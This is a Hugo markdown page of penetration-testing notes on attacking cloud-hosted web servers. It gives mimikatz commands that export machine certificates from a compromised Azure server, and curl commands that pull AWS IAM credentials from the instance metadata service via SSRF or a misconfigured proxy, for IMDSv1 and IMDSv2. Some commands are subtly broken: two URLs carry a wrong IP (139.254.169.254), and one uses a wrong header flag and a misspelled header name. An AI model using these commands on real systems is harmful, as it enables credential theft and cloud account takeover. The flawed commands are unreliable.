---
### The title for the content.
title : "cloud-provider-web-servers"
### If set, this will be used for the page's menu entry (instead of the `title` attribute)
# menuTitle : "Web Servers"
### The title of the page in menu will be prefixed by this HTML content
# pre : ""
### The title of the page in menu will be postfixed by this HTML content
# post : ""
### The description for the content.
description : "Metdata services FTW."
### The datetime assigned to this page.
date : 2020-03-10T16:43:45+01:00
### Appears as the tail of the output URL. A value specified in front matter will override the segment of the URL based on the filename.
# slug : "password-spraying"
### Aliases can be used to create redirects to your page from other URLs.
# aliases : [""]
### Display name of this page modifier. If set, it will be displayed in the footer.
# LastModifierDisplayName : ""
### Email of this page modifier. If set with LastModifierDisplayName, it will be displayed in the footer
# LastModifierEmail : ""
### Table of content (toc) is enabled by default. Set this parameter to true to disable it.
# disableToc : true
### Set the page as a chapter, changing the way it's displayed
# chapter : true
### Hide a menu entry by setting this to true
# hidden : true
### If true, the content will not be rendered unless the --buildDrafts flag is passed to the hugo command.
# draft : true
### Used for ordering your content in lists. Lower weight gets higher precedence. So content with lower weight will come first.
### 0 does nothing !
weight : 0
### Used to tag content. By default this is inherited using cascading from _index.md files
### Only set of you want to overwrite these inherited values.
# tags : [""]
---

## Cloud provider web servers

Cloud provider web servers have some special things you might not have on your 'normal' webserver.

### Azure windows webserver

If you are able to compromise an azure server you might be able to use mimikatz to extract certificates and try to authenticitate to Azure with them.

```
crypto::capi
privilege::debug
crypto::cng
crypto::certificates /systemstore:local_machine/store:my /export
```

### AWS

#### Instance Metadata

Cloud server hosted on services like EC2 need a way to orient themselves. Therefore a metadata endpoint was created that runs at 169.254.169.254. This can contain access/secrets keys to AWS and IAM credentials.

This should be reachable from localhost, can be abused after server compromise or SSRF.

IAM credentials are stored here

```
http://139.254.169.254/latest/meta-data/iam/security-credentials/<IAM ROLE NAME>
```

Can be hit externally if nginx is misconfigured on AWS

```
curl --proxy host.domain.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
```

##### AWS EC2 Instance Metadata service Version 2 (IMDSv2)

Updated in november 2019. v2 requires a PUT request that response with a token.

```
TOKEN=`curl -X PUT "http://139.254.169.254/latest/api/token" -h "X-aws-ec2-metadata-token-ttl-secconds: 21600"`

curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```